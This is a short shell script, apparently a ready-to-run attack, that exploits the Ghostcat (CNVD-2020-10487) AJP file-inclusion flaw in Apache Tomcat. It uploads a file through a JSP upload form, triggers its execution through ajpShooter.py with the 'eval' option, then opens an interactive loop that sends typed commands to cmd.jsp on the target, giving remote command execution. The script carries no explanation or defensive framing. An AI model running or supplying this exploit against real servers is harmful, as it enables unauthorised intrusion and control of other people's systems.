#!/bin/sh

if [ -z $1 ];then
    echo "bash attack.sh SERVER_IP"
    exit 1
fi

echo "Uploading ghostcat.txt ..."

IP=$1

        curl -X POST -F uploadFIle=@ghostcat.txt $IP:8080/viewPage.jsp

echo "ghostcat.txt is uploaded"

	python Ghostcat-CNVD-2020-10487/ajpShooter.py http://$IP 8009 /file/ghostcat.txt eval

echo "Sucessfully exploit the server"

while :
do
	echo "Type a command"
	echo "Press [CTRL+C] to stop.."
	read commands
        curl -X POST $IP:8080/cmd.jsp?cmd=$commands
done

